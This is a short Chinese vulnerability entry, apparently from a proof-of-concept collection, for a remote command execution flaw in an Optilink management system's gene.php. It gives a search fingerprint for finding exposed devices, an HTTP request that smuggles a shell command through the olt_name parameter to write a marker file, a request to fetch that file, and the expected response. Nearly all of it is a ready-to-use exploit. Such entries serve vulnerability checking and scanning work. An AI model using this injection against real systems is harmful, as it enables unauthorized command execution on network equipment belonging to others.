# Optilink管理系统gene.php存在远程命令执行漏洞

Optilink ｜ 命令执行 ｜ —
- **指纹**：`body="/html/css/dxtdata.css"`
- **请求**：`GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+123456>%20test112test.txt;%20%23%20 HTTP/1.1`

**Payload**
```
GET /cgi/fsystem/test112test.txt HTTP/1.1
Host:
```
- **响应特征**：200 123456